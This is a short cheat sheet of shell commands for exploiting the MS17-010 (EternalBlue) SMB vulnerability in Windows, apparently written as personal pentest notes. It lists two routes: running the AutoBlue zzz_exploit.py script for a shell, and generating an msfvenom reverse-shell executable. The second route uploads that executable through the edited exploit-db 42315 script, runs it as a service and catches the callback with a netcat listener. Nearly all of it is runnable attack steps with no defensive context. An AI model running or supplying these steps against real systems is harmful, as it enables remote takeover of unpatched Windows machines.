# install dependecies
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
virtualenv -p /usr/bin/python2.7 exploit2
source exploit2/bin/activate
cd AutoBlue-MS17-010
pip2.7 install -r requirements.txt

# get semi interactive shell
python zzz_exploit.py <rhost>


# another variant

# install dependecies
virtualenv -p /usr/bin/python2.7 exploit2
source exploit2/bin/activate
pip install impacket
wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py

# generate reverse shell
msfvenom -p windows/shell_reverse_tcp -f exe lhost=<lhost> lport=<lport> > shell.exe

vim 42315.py
# insert (user can also be empty):
USERNAME = '<user>'
...
     smb_send_file(smbConn, "<path/to/local/shell.exe>", 'C', '/shell.exe')
     service_exec(conn, r'cmd /c C:\shell.exe')

# start listener
nc -lnvp <lport>

# exploit
python 42315.py <rhost>

# References
https://www.exploit-db.com/exploits/42315

